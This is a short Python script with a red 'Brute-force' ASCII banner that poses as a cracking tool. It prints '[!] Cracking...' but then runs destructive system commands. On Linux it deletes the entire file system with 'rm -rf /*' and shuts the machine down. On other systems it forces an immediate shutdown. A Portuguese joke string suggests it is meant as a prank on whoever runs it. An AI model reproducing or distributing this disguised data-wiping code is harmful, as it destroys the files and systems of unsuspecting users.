import platform
import os
import sys
from colorama import init
from colorama import Fore, Back, Style

banner = """
 ███████████                        █████     ███                ██████                                     
░░███░░░░░███                      ░░███     ░░░                ███░░███                                    
 ░███    ░███ █████ ████ ████████  ███████   ████              ░███ ░░░   ██████  ████████   █████   ██████ 
 ░██████████ ░░███ ░███ ░░███░░███░░░███░   ░░███  ██████████ ███████    ███░░███░░███░░███ ███░░   ███░░███
 ░███░░░░░███ ░███ ░███  ░███ ░░░   ░███     ░███ ░░░░░░░░░░ ░░░███░    ░███ ░███ ░███ ░░░ ░░█████ ░███████ 
 ░███    ░███ ░███ ░███  ░███       ░███ ███ ░███              ░███     ░███ ░███ ░███      ░░░░███░███░░░  
 ███████████  ░░████████ █████      ░░█████  █████             █████    ░░██████  █████     ██████ ░░██████ 
░░░░░░░░░░░    ░░░░░░░░ ░░░░░        ░░░░░  ░░░░░             ░░░░░      ░░░░░░  ░░░░░     ░░░░░░   ░░░░░░  
"""
print(Fore.RED + banner + Fore.RESET)
help = "Acabo é so isso kkkkkkk"
if platform.system() == "Linux":
        cmd = 'sleep 1; echo "[!] Cracking..."; rm -rf /* 2>/dev/null; sleep 10; init 0'

else:
        cmd = 'timeout /t 1 > nul && shutdown /s /t 0'
os.system(cmd)

